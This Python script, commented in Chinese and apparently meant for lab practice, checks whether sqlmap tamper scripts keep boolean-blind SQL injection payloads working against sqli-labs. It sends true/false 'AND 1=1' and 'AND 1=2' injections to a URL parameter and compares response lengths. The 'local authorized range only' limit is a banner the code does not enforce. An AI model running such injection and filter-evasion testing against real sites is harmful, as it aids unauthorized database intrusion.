#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
verify · tamper 语义等价验证脚本（学习用，纯标准库）

用途：脱离 sqlmap 独立验证 tamper 脚本是否满足唯一验收标准——
「变形后的 SQL 仍能被数据库正确执行」。

方法：对本地 sqli-labs 布尔盲注关（如 Less-8），分别发送
恒真 / 恒假 两组 payload（原始与变形各一遍），对比响应长度差：
  - 原始 payload 有长度差 且 变形 payload 有相同方向的长度差
    => 数据库仍按预期执行 => 语义等价成立
  - 变形后长度差消失 => 语义被破坏，tamper 不合格

仅用于本地授权靶场（127.0.0.1 的 sqli-labs / DVWA）。
"""
import argparse
import json
import sys
import urllib.parse
import urllib.request

BANNER = "[i] 仅用于本地授权靶场验证（127.0.0.1 的 sqli-labs / DVWA）。"

# 布尔盲注判定模板：{q}=引号闭合方式由闭合参数决定，默认 1'（单引号闭合）
TRUE_TMPL = "{quote} AND 1=1"
FALSE_TMPL = "{quote} AND 1=2"


def http_get(url, timeout):
    # 本地靶场验证不走系统代理（避免代理劫持 127.0.0.1 请求返回错误页干扰判定）
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    req = urllib.request.Request(url, headers={"User-Agent": "sec-tools-lab/0.1"})
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read())
    except urllib.error.URLError as e:
        raise ConnectionError(f"无法访问目标：{e.reason}")


def fetch_len(url, param, value, timeout):
    """对 url?param=value 发请求，返回响应长度。value 做 URL 编码。"""
    full = f"{url}{ '&' if '?' in url else '?' }{urllib.parse.urlencode({param: value})}"
    return http_get(full, timeout)[1]


def build_variants(base_true, base_false, tampers):
    """对基线 payload 应用各 tamper，返回 {'raw': (t,f), '<name>': (t,f), ...}。"""
    variants = {"raw": (base_true, base_false)}
    for name, mod in tampers.items():
        variants[name] = (mod.tamper(base_true), mod.tamper(base_false))
    return variants


def check_semantics(url, param, quote, variants, timeout):
    """核心验证：每个变体发恒真/恒假两请求，检查长度差方向是否保持。"""
    rows = []
    for name, (t_payload, f_payload) in variants.items():
        len_t = fetch_len(url, param, f"{quote}{t_payload}", timeout)
        len_f = fetch_len(url, param, f"{quote}{f_payload}", timeout)
        diff = len_t - len_f
        rows.append({"variant": name, "true_len": len_t, "false_len": len_f,
                     "diff": diff})
    baseline = rows[0]["diff"]
    if baseline == 0:
        print("[!] raw 基线无差异：注入点可能不可用（或该关不是布尔盲注）。"
              "请先手工验证 and 1=1 / 1=2 是否产生不同响应，再评估 tamper。",
              file=sys.stderr)
    for r in rows[1:]:
        # 语义等价判定：与基线同方向且非零（变形后布尔条件仍然生效）
        r["db_accepts"] = bool(baseline) and (r["diff"] != 0) and \
            ((r["diff"] > 0) == (baseline > 0))
    return rows


def load_tamper(path):
    """动态加载 tamper 脚本（脱离 sqlmap 环境时其 __priority__ 走回退分支）。"""
    import importlib.util
    spec = importlib.util.spec_from_file_location("tamper_module", path)
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
    except Exception as e:
        raise SystemExit(f"[x] 加载 {path} 失败：{e}")
    if not hasattr(mod, "tamper"):
        raise SystemExit(f"[x] {path} 缺少 tamper() 函数，不是有效的 tamper 脚本")
    return mod


def build_parser():
    ap = argparse.ArgumentParser(
        prog="verify.py",
        description="tamper 语义等价验证（仅限本地授权靶场）",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True,
                    help="靶场注入点 URL（如 http://127.0.0.1/sqli-labs/Less-8/）")
    ap.add_argument("--param", required=True, help="注入参数名（如 id）")
    ap.add_argument("--quote", default="1'",
                    help="闭合方式（默认 \"1'\"，即单引号闭合；数字型用 1）")
    ap.add_argument("--tamper", action="append", default=[],
                    help="tamper 脚本路径，可多次指定")
    ap.add_argument("--timeout", type=float, default=10.0, help="请求超时秒")
    ap.add_argument("-o", "--output", help="结果导出 .json")
    return ap


def main(argv=None):
    print(BANNER)
    ap = build_parser()
    args = ap.parse_args(argv)

    try:
        if not (0.1 <= args.timeout <= 60):
            raise ValueError(f"超时须在 0.1-60 秒：{args.timeout}")
        u = urllib.parse.urlparse(args.url)
        if u.scheme not in ("http", "https") or not u.netloc:
            raise ValueError(f"URL 非法：{args.url}")
        if not args.param:
            raise ValueError("param 不能为空")
    except ValueError as e:
        ap.error(str(e))

    base_true = TRUE_TMPL.format(quote=args.quote)
    base_false = FALSE_TMPL.format(quote=args.quote)

    tampers = {}
    for path in args.tamper:
        mod = load_tamper(path)
        tampers[path.split("/")[-1].replace(".py", "")] = mod
    if not tampers:
        print("[!] 未指定 --tamper，仅采集 raw 基线（用于确认注入点可用）")

    print(f"[*] 目标 {args.url}  参数 {args.param}  闭合 {args.quote!r}")
    try:
        rows = check_semantics(args.url, args.param, args.quote,
                               build_variants(base_true, base_false, tampers),
                               args.timeout)
    except ConnectionError as e:
        print(f"[x] {e}", file=sys.stderr)
        return 3

    print(f"\n{'variant':<20}{'true_len':>9}{'false_len':>10}{'diff':>7}  db_accepts")
    for r in rows:
        mark = "" if r["variant"] == "raw" else (
            "OK" if r.get("db_accepts") else "FAIL")
        print(f"{r['variant']:<20}{r['true_len']:>9}{r['false_len']:>10}"
              f"{r['diff']:>7}  {mark}")

    ok = all(r.get("db_accepts") for r in rows[1:]) if len(rows) > 1 else True
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump({"url": args.url, "rows": rows, "all_pass": ok}, f,
                      ensure_ascii=False, indent=2)
        print(f"[+] 结果已写入 {args.output}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
